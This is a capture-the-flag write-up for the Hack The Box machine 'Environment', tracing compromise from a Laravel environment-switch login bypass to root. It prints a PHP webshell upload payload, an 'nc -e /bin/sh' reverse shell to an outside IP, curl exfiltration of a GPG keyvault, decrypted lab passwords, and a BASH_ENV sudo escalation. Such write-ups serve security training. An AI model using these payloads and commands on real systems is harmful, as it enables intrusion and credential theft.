![https://app.hackthebox.com/machines/659](https://app.hackthebox.com/machines/659)

## ENUM:

nmap result

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
```

dirb of the web page:

```
---- Scanning URL: http://environment.htb/ ----
==> DIRECTORY: http://environment.htb/build/                                                                       
+ http://environment.htb/favicon.ico (CODE:200|SIZE:0)                                                             
+ http://environment.htb/index.php (CODE:200|SIZE:4602)                                                            
+ http://environment.htb/login (CODE:200|SIZE:2391)                                                                
+ http://environment.htb/logout (CODE:302|SIZE:358)                                                                
+ http://environment.htb/mailing (CODE:405|SIZE:244873)                                                            
+ http://environment.htb/robots.txt (CODE:200|SIZE:24)                                                             
==> DIRECTORY: http://environment.htb/storage/                                                                     
+ http://environment.htb/up (CODE:200|SIZE:2125)                                                                   
+ http://environment.htb/upload (CODE:405|SIZE:244871)                                                             
==> DIRECTORY: http://environment.htb/vendor/                                                                      
                                                                                                                   
---- Entering directory: http://environment.htb/build/ ----
==> DIRECTORY: http://environment.htb/build/assets/                                                                
                                                                                                                   
---- Entering directory: http://environment.htb/storage/ ----
==> DIRECTORY: http://environment.htb/storage/files/                                                               
                                                                                                                   
---- Entering directory: http://environment.htb/vendor/ ----
                                                                                                                   
---- Entering directory: http://environment.htb/build/assets/ ----
                                                                                                                   
---- Entering directory: http://environment.htb/storage/files/ ----
                                                                                                                   
-----------------
END_TIME: Thu Jul  3 02:18:17 2025
DOWNLOADED: 27672 - FOUND: 8
```

## Possible track:

#### index.php page

XSRF token:

```
eyJpdiI6IlV4Wk9SajFzVTkrbUhJVC83cHZ4V2c9PSIsInZhbHVlIjoic0ZIZDJ5T3ZPLzlGVXQ4a2FtQ1VFS0o2cDRCc2ZhMDBiODBGZVBONkREZ29IUGJPWVFZdVJBWTNoOUJtT3RPdlJkY3BVbWdNRDVZNk5IR2hiY2hNRnZtUjhkSFJvNWJKS1FrWldoOExILzR0Z0FUcWpvODgzbnJOeENXSXVkSHIiLCJtYWMiOiJlOGYwOGFhMjEyYjA2OGIxYThlZDcwNTEyNWYwNTYyNTU1MTUwOGI4MzAzZTRiOWY1MGY2ZGZkYzgxMTI3NDk1IiwidGFnIjoiIn0%3D
```

which translates to:
`{"iv":"UxZORj1sU9+mHIT/7pvxWg==","value":"sFHd2yOvO/9FUt8kamCUEKJ6p4Bsfa00b80FePN6DDgoHPbOYQYuRAY3h9BmOtOvRdcpUmgMD5Y6NHGhbchMFvmR8dHRo5bJKQkZWh8LH/4tgATqjo883nrNxCWIudHr","mac":"e8f08aa212b068b1a8ed705125f05625551508b8303e4b9f50f6dfdc81127495","tag":""}`

Laravel session:

```
eyJpdiI6IjA2ZEpPdTZOZWtkbC9LYXNOd2pveEE9PSIsInZhbHVlIjoiQm1wb3BGSlJHQWJjYmlCQjBzVGxmYTVsck96RFZDa213TE9sVjdhZlNGRWltSmJnblRqUzQzSGp3S3BBQURNdW44cms1Z3dLNXhpTGZ1OHZCVVhMQjl2RW1YWTQ2cHloWnQrYW5NajBQaHI5aWtrai9oeXlQSWVjUHJlb0pBdG4iLCJtYWMiOiI4ZDQ3Zjc5Zjg0YTQxNjhjYWNmMTkzZGJmZDljMzU2YzFjZTc0MWRlYzA1NDViZjk2MzNiMmQzM2Q3ZjVjNDc3IiwidGFnIjoiIn0%3D
```

which translates to:
`{"iv":"06dJOu6Nekdl/KasNwjoxA==","value":"BmpopFJRGAbcbiBB0sTlfa5lrOzDVCkmwLOlV7afSFEimJbgnTjS43HjwKpAADMun8rk5gwK5xiLfu8vBUXLB9vEmXY46pyhZt+anMj0Phr9ikkj/hyyPIecPreoJAtn","mac":"8d47f79f84a4168cacf193dbfd9c356c1ce741dec0545bf9633b2d33d7f5c477","tag":""}`

a possibly exploitable code:

```html
<script>
        document.getElementById('mailingListForm').addEventListener('submit', async function (event) {
            event.preventDefault(); // Prevent the default form submission behavior
            const email = document.getElementById('email').value;
            const csrfToken = document.getElementsByName("_token")[0].value;
            const responseMessage = document.getElementById('responseMessage');
            try {
                const response = await fetch('/mailing', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: "email=" + email + "&_token=" + csrfToken,
                });
                if (response.ok) {
                    const data = await response.json();
                    responseMessage.textContent = data.message; // Display success message
                    responseMessage.style.color = 'greenyellow';
                } else {
                    const errorData = await response.json();
                    responseMessage.textContent = errorData.message || 'An error occurred.';
                    responseMessage.style.color = 'red';
                }
            } catch (error) {
                responseMessage.textContent = 'Failed to send the request.';
                responseMessage.style.color = 'red';
            }
        });
    </script>
```

#### login page

I try to look at a login page found with dirb

error return displayed on the page ?:

![alt text](note/ctf/asset/HTB_environment00.png)

clue from the challenge name + laravel + exploitable environment variable leads me here: CVE-2024-21534
[https://vsec.com.br/exploiting-laravel-a-closer-look-at-cve-2024-21534/](https://vsec.com.br/exploiting-laravel-a-closer-look-at-cve-2024-21534/)

I will try to generate a wrong login request to see if I can get a bit more info on a laravel interface:

```
POST /login HTTP/1.1
Host: environment.htb
Content-Length: 102
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://environment.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://environment.htb/login?error=Invalid%20credentials.
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InlYbmdLRlV2K1I3SERiSHYyZ25DbWc9PSIsInZhbHVlIjoiV0d3Z0pYc0xzSDNpOGdsYmpzbHNHempVeWhRNk1QODUxdUNySUlRYmoxTFNYa25rZkFPUXhYZ0F4TVZzMHAxTTZVc3hNSXBSRFR4ZUN2MFBWdUtEeDYvc2JPNWJMVlFidzdXeGNyS2FGYktBek5WUHFTRGlJem9tWVVicDlvdVgiLCJtYWMiOiJhMGUyZmRhOWFmM2ViMWY4ZWFhZTViNWE1ZWY4ZTdiNzRiNDI0ZTFmNzlkYzJjZmU4NjFkNDNkMWU3ZGI5MTE2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkFSQWdyVzkvMXlmY2lEQkd1bHBIUUE9PSIsInZhbHVlIjoidzlROGh6MEpvWjBHZ2tNMlpPTEJhSFFGQWhiVitMNjRYZGxleFBpc3BGVmVQZFRXVWxkZTlKTEREc2JFRjdTbTVGTmw2YUsxMFIwNktCRjlIZmJXS016c01ZOEtWanNjdjZJZkpqTERSWGJwQzVMU3J0ZjBoUVRLYm5EK2pOcHgiLCJtYWMiOiIyYTYxMDRjMjI4OWI4YmE3YmM5M2RjMWQzODRhYjk4MjUzNWQ3N2I2ZTYxYmEyMzlhYjNkODZlZGMwOGFlOTg0IiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=1IhwKwvK9nfTjBaYQFD94CyJiTivdTCWEpt5GTXD&email=zeroz1337%40dot.com&password=test
```

I deleted "remember" to test:

![alt text](note/ctf/asset/HTB_environment0.png)

perfect I will play with the fields: put numbers on remember etc... to navigate in the code:

```
POST /login HTTP/1.1
Host: environment.htb
Content-Length: 102
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://environment.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://environment.htb/login?error=Invalid%20credentials.
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6IjZKTGVpNFN0aWNMQmN2clFua2trVEE9PSIsInZhbHVlIjoiMUd4OTEzQ3MwZDFhTmdiUTc0Vjc4bzlvSmU0Q2FjTUFrZHJZaTZvTi8veHBMeHJXOTY2MDdka2lKYWx0MnFaSUt4QngySUpXVHB2T1BSZ0hFSW9iSlF5WC94UHZoYnAyMThHOWkrZ2k1Y3FsSnNVRHhsZVdpeTZlK09oMml5SW0iLCJtYWMiOiI5YmM3NzhiMmRhYTlhZDA5ZjM4ZjhlYTI1NGJjMmUzZmYwYzI4ZWY1YjI5ZTVmODk2NTg5ZWEzOGM2NWUwZmM2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InhOWGFPNko2VG9OVXRaT2FNc3FJb0E9PSIsInZhbHVlIjoiZnBVWDNLcVprMjEwL3RNSmNuWDR3RUdCQ1F1UGcxcENzQ0JSaS9BL0JvUCtYcmRjQ1luYmo2T3dRcUxGMmFHS2hDQnBzb2MrUnJoWm5QWmhqTGpTK200bjNRZElQby9PRjhRSkhCSU8zNjIrc3dqdytEMXlsd1pGVVh2SS9EVXgiLCJtYWMiOiJiNGY5ZDE4ODc3MzBhODFiYzJjM2RkNjgzNDAzOGI1ZWMwMjg5Zjg5N2RlZjk0NTAwYTI2ZTMxMmNiNjgyZmE3IiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=1IhwKwvK9nfTjBaYQFD94CyJiTivdTCWEpt5GTXD&email=zeroz1337%40dot.com&password=test&remember=1337
```

gives me an interesting result:

![alt text](note/ctf/asset/HTB_environment.png)

there is a preprod environment that I can exploit and I have exactly the method with the previous link by adding ?--env=preprod to get access to a default account!

```
POST /login?--env=preprod HTTP/1.1
Host: environment.htb
Content-Length: 102
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://environment.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://environment.htb/login?error=Invalid%20credentials.
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InlYbmdLRlV2K1I3SERiSHYyZ25DbWc9PSIsInZhbHVlIjoiV0d3Z0pYc0xzSDNpOGdsYmpzbHNHempVeWhRNk1QODUxdUNySUlRYmoxTFNYa25rZkFPUXhYZ0F4TVZzMHAxTTZVc3hNSXBSRFR4ZUN2MFBWdUtEeDYvc2JPNWJMVlFidzdXeGNyS2FGYktBek5WUHFTRGlJem9tWVVicDlvdVgiLCJtYWMiOiJhMGUyZmRhOWFmM2ViMWY4ZWFhZTViNWE1ZWY4ZTdiNzRiNDI0ZTFmNzlkYzJjZmU4NjFkNDNkMWU3ZGI5MTE2IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkFSQWdyVzkvMXlmY2lEQkd1bHBIUUE9PSIsInZhbHVlIjoidzlROGh6MEpvWjBHZ2tNMlpPTEJhSFFGQWhiVitMNjRYZGxleFBpc3BGVmVQZFRXVWxkZTlKTEREc2JFRjdTbTVGTmw2YUsxMFIwNktCRjlIZmJXS016c01ZOEtWanNjdjZJZkpqTERSWGJwQzVMU3J0ZjBoUVRLYm5EK2pOcHgiLCJtYWMiOiIyYTYxMDRjMjI4OWI4YmE3YmM5M2RjMWQzODRhYjk4MjUzNWQ3N2I2ZTYxYmEyMzlhYjNkODZlZGMwOGFlOTg0IiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=1IhwKwvK9nfTjBaYQFD94CyJiTivdTCWEpt5GTXD&email=zeroz1337%40dot.com&password=test&remember=False
```

I access the dashboard on hish’s account.

once on the dashboard I try to change the profile picture and I see in the server response that it is saved in a specific path:

![alt text](note/ctf/asset/HTB_environment1.png)

maybe an opportunity to try a webshell?

since it detects the file type I will BURP to intercept the upload of an image and remplace by my payload using a GIF header + . at the end

```
shell.php.

GIF89a
<?php system($_GET['cmd']);?>
```

and it is saved here [http://environment.htb/storage/files/webshell1.php](http://environment.htb/storage/files/webshell1.php)

so I can pass my commands here and extract some info!

## Extraction:

passwd:

```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin messagebus:x:100:107::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin sshd:x:102:65534::/run/sshd:/usr/sbin/nologin hish:x:1000:1000:hish,,,:/home/hish:/bin/bash _laurel:x:999:996::/var/log/laurel:/bin/false
```

hish home files:

```bash
total 44 drwxr-xr-x 6 hish hish 4096 Jul 3 02:35 . drwxr-xr-x 3 root root 4096 Jan 12 11:51 .. lrwxrwxrwx 1 root root 9 Apr 7 19:29 .bash_history -> /dev/null -rw-r--r-- 1 hish hish 220 Jan 6 21:28 .bash_logout -rw-r--r-- 1 hish hish 3526 Jan 12 14:42 .bashrc drwxr-xr-x 4 hish hish 4096 Jul 3 11:11 .gnupg -rw------- 1 hish hish 20 Jul 3 02:35 .lesshst drwxr-xr-x 3 hish hish 4096 Jan 6 21:43 .local -rw-r--r-- 1 hish hish 807 Jan 6 21:28 .profile drwxr-xr-x 4 hish hish 4096 Jul 2 20:23 .terminfo drwxr-xr-x 2 hish hish 4096 Jan 12 11:49 backup -rw-r--r-- 1 root hish 33 Jul 2 14:03 user.txt
```

user.txt is accessible so i dump it

for the next step, I turn my webshell into a revshell like this:
`http://environment.htb/storage/files/webshell1.php?cmd=nc+-e+/bin/sh+10.10.14.123+4848`

via my python exfiltration server, I browse hish’s home and I find keyvault.gpg that I download via curl:
`curl -F 'data=@/home/hish/backup/keyvault.gpg' http://ip:port`

I also go into the application directory: `/var/www/app/`

and observe the files present:

```bash
total 520
drwxr-xr-x  13 www-data www-data   4096 Apr  7 19:58 .
drwxr-xr-x   4 root     root       4096 Apr  7 19:58 ..
-rw-r--r--   1 www-data www-data    258 Jan 12 10:37 .editorconfig
-rw-r--r--   1 www-data www-data   1177 Jan 12 10:42 .env
-rw-r--r--   1 www-data www-data   1099 Jan 12 10:37 .env.example
-rw-r--r--   1 www-data www-data    186 Jan 12 10:37 .gitattributes
-rw-r--r--   1 www-data www-data    285 Jan 12 10:37 .gitignore
-rw-r--r--   1 www-data www-data   4109 Jan 12 10:37 README.md
drwxr-xr-x   6 www-data www-data   4096 Apr  7 19:58 app
-rw-r--r--   1 www-data www-data    350 Jan 12 10:37 artisan
drwxr-xr-x   3 www-data www-data   4096 Apr  7 19:58 bootstrap
-rw-r--r--   1 www-data www-data   2354 Jan 12 10:37 composer.json
-rw-r--r--   1 www-data www-data 299017 Jan 12 10:37 composer.lock
drwxr-xr-x   2 www-data www-data   4096 Apr  7 19:58 config
drwxr-xr-x   5 www-data www-data   4096 Jul  4 23:20 database
drwxr-xr-x 140 www-data www-data   4096 Apr  7 19:59 node_modules
-rw-r--r--   1 www-data www-data 117751 Jan 12 10:37 package-lock.json
-rw-r--r--   1 www-data www-data    378 Jan 12 10:37 package.json
-rw-r--r--   1 www-data www-data   1191 Jan 12 10:37 phpunit.xml
-rw-r--r--   1 www-data www-data     93 Jan 12 10:37 postcss.config.js
drwxr-xr-x   4 www-data www-data   4096 Apr  7 19:58 public
drwxr-xr-x   5 www-data www-data   4096 Apr  7 19:58 resources
drwxr-xr-x   2 www-data www-data   4096 Apr  7 19:58 routes
drwxr-xr-x   5 www-data www-data   4096 Apr  7 19:58 storage
-rw-r--r--   1 www-data www-data    551 Jan 12 10:37 tailwind.config.js
drwxr-xr-x   4 www-data www-data   4096 Apr  7 19:58 tests
drwxr-xr-x  42 www-data www-data   4096 Apr  7 19:58 vendor
-rw-r--r--   1 www-data www-data    377 Jan 12 10:37 vite.config.js
```

so I find a `.env` as well as a database folder `database` and other config

.env:

```
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:BRhzmLIuAh9UG8xXCPuv0nU799gvdh49VjFDvETwY6k=
APP_DEBUG=true
APP_TIMEZONE=UTC
APP_URL=http://environment.htb
APP_VERSION=1.1

APP_LOCALE=en
APP_FALLBACK_LOCALE=en
APP_FAKER_LOCALE=en_US

APP_MAINTENANCE_DRIVER=file
# APP_MAINTENANCE_STORE=database

PHP_CLI_SERVER_WORKERS=4

BCRYPT_ROUNDS=12

LOG_CHANNEL=stack
LOG_STACK=single
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=sqlite
# DB_HOST=127.0.0.1
# DB_PORT=3306
# DB_DATABASE=laravel
# DB_USERNAME=root
# DB_PASSWORD=

SESSION_DRIVER=database
SESSION_LIFETIME=120
SESSION_ENCRYPT=false
SESSION_PATH=/
SESSION_DOMAIN=null

BROADCAST_CONNECTION=log
FILESYSTEM_DISK=local
QUEUE_CONNECTION=database

CACHE_STORE=database
CACHE_PREFIX=

MEMCACHED_HOST=127.0.0.1

REDIS_CLIENT=phpredis
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=log
MAIL_SCHEME=null
MAIL_HOST=127.0.0.1
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

VITE_APP_NAME="${APP_NAME}"
```
I can see interesting things :

* an API key in b64: `BRhzmLIuAh9UG8xXCPuv0nU799gvdh49VjFDvETwY6k=`

* a sqlite3 database named laravel with a root username and no password

* a REDIS service running on port 6379 (POSSIBLE PRIV ESC later: [https://hackviser.com/tactics/pentesting/services/redis](https://hackviser.com/tactics/pentesting/services/redis))

* a mailing service on port 2525

now I will try to decrypt the gpg file, to do this I will copy `.gnupg` found in /home/hish which corresponds to the configuration and key storage directory used by GPG into the tmp directory where I can work:

`cp -r .gnupg /tmp/.zeroz`

I apply the correct rights:

`chmod -R 700 .zeroz`

finally I check if keys are present:

`gpg --homedir /tmp/.zeroz --list-secret-keys`

it’s good I can decrypt with this folder!

`gpg --homedir /tmp/.zeroz --output /tmp/.keys --decrypt /home/hish/backup/keyvault.gpg`

finally I display the result:

```
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

so the possible password would be `marineSPm@ster!!` I try the SSH connection:

`ssh hish@10.10.11.67`

and it works!

## PRIV ESC ROOT

linpeas gives me a good lead: sudo -l

```
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

here I see systeminfo but especially env\_keep+="ENV BASH\_ENV"

this means that when the user `hish` so me uses `sudo`, the environment variables `ENV` and `BASH_ENV` are not cleaned and so I can perform a bypass to execute bash commands


I will use the fact that BASH\_ENV is not cleaned to include `bash -p` in a file malicious.sh in order to obtain a shell with sudo rights

why it works:
`BASH_ENV` is a special Bash variable

when a Bash script is executed **non-interactively** (with the full path as if it were a script and not a command), Bash **executes the file pointed by `BASH_ENV`** before any other command.

so if I execute the binary `/usr/bin/systeminfo` with sudo and I make BASH\_ENV point to my malicious.sh then it will execute a shell with root rights!

```
echo 'bash -p' > malicious.sh
chmod +x malicious.sh
sudo BASH_ENV=malicious.sh /usr/bin/systeminfo
```

and I become root!